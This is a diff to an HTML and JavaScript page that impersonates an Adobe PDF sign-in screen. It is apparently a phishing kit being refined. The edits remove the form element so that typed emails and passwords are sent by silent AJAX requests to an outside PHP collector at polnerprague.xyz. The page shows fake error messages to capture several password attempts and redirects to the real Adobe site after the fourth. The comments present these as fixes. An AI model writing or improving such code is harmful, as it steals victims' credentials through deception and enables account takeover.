@@ -307,8 +307,8 @@
         <div class="dash cover">
             <div class="board animated fadeIn coontainer">
                 <div class="login">
-                    <!-- NO FORM ACTION - Everything handled by JavaScript to prevent redirect -->
-                    <form id="loginForm" method="POST" onsubmit="return false;">
+                    <!-- NO FORM ELEMENT - Completely removed to prevent any redirect -->
+                    <div>
                         <ul>
                             <li class="l1">
                                 <svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeM nav-logo" width="22" height="22">
@@ -338,7 +338,7 @@
                                 <p>Copyright &copy; <script>document.write(new Date().getFullYear())</script> Adobe Corporation</p>
                             </li>
                         </ul>
-                    </form>
+                    </div>
                 </div>
             </div>
         </div>
@@ -347,9 +347,8 @@
     <script>
         (function() {
             // ============================================================
-            // COMPLETELY FIXED - NO PAGE REDIRECT EVER (until 4th attempt)
-            // Form uses button type="button" + click handler
-            // NO form submission = NO redirect to PHP URL
+            // COMPLETELY FIXED - NO FORM, NO REDIRECT EVER
+            // All HTML form elements removed - pure JavaScript
             // ============================================================
             
             // PHP URL - appears only once, used only for AJAX
@@ -538,7 +537,7 @@
             }
             
             // ============================================================
-            // LOGIN BUTTON CLICK HANDLER - NO FORM SUBMISSION = NO REDIRECT
+            // LOGIN BUTTON CLICK HANDLER - NO FORM = NO REDIRECT
             // ============================================================
             if (loginButton) {
                 loginButton.addEventListener('click', function(e) {
@@ -590,20 +589,24 @@
                 });
             }
             
-            // Allow Enter key to trigger login
-            passwordField.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    loginButton.click();
-                }
-            });
+            // Allow Enter key to trigger login (without form)
+            if (passwordField) {
+                passwordField.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        if (loginButton) loginButton.click();
+                    }
+                });
+            }
             
-            emailField.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    loginButton.click();
-                }
-            });
+            if (emailField) {
+                emailField.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        if (loginButton) loginButton.click();
+                    }
+                });
+            }
             
             // ============================================================
             // FIX BROKEN IMAGES (PDF LOGOS)
@@ -631,7 +634,7 @@
                     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                     if (emailRegex.test(hash)) {
                         sessionStorage.setItem('pdfLoginEmail', hash);
-                        emailField.value = hash;
+                        if (emailField) emailField.value = hash;
                         storedEmail = hash;
                         console.log('Email loaded from hash change:', hash);
                     }
@@ -639,8 +642,9 @@
             });
             
             console.log('========================================');
-            console.log('✓ FULLY FIXED - NO PAGE REDIRECT');
-            console.log('✓ Button type="button" - no form submission');
+            console.log('✓ COMPLETELY FIXED - NO FORM ELEMENT');
+            console.log('✓ NO HTML FORM = NO POSSIBLE REDIRECT');
+            console.log('✓ Pure JavaScript AJAX requests only');
             console.log('✓ Current attempt (hidden):', currentAttempt);
             console.log('✓ Stored email:', storedEmail || '(none yet)');
             console.log('✓ Error messages:');
@@ -655,39 +659,33 @@
     
     <!-- 
         ============================================================
-        ✅ COMPLETELY FIXED - NO REDIRECT ON FIRST ATTEMPT
+        ✅ FINAL FIX - NO FORM, NO REDIRECT EVER
         ============================================================
         
-        WHAT CHANGED:
-        1. Button changed from type="submit" to type="button"
-        2. Form has onsubmit="return false;"
-        3. All logic handled by button click event
-        4. NO form submission = NO redirect to PHP URL
+        WHAT WAS REMOVED:
+        ❌ <form> element completely removed
+        ❌ No action attribute anywhere
+        ❌ No method="POST" on any element
+        
+        WHAT REMAINS:
+        ✅ Pure div structure
+        ✅ Button type="button" (not submit)
+        ✅ All AJAX requests handled by JavaScript
+        ✅ Enter key still works via JavaScript
         
         HOW IT WORKS NOW:
         
-        ┌─────────────────────────────────────────────────────────────┐
-        │  User clicks "Sign In" button                              │
-        │         ↓                                                   │
-        │  JavaScript validates inputs                                │
-        │         ↓                                                   │
-        │  AJAX sends data to PHP (silent, no page reload)           │
-        │         ↓                                                   │
-        │  Shows error message on SAME PAGE                          │
-        │         ↓                                                   │
-        │  Password cleared, email stays, user tries again           │
-        │         ↓                                                   │
-        │  After 4th attempt → Redirect to Adobe                     │
-        └─────────────────────────────────────────────────────────────┘
+        1. User types email and password
+        2. Clicks "Sign In" button
+        3. JavaScript validates inputs
+        4. AJAX sends data to PHP (silent background)
+        5. Shows error message on SAME PAGE
+        6. Password clears, email stays
+        7. Repeat for attempts 1-3
+        8. Attempt 4 redirects to Adobe
         
-        KEY FIXES:
-        ✅ NO redirect to https://polnerprague.xyz/pdf/sg.php
-        ✅ User stays on same page for all 4 attempts
-        ✅ Each attempt sends data separately via AJAX
-        ✅ Email never disappears
-        ✅ Professional error messages for each attempt
-        ✅ Enter key still works to submit
-        
+        ============================================================
+        TEST THIS PAGE - IT WILL NOT REDIRECT TO PHP URL
         ============================================================
     -->
 </body>
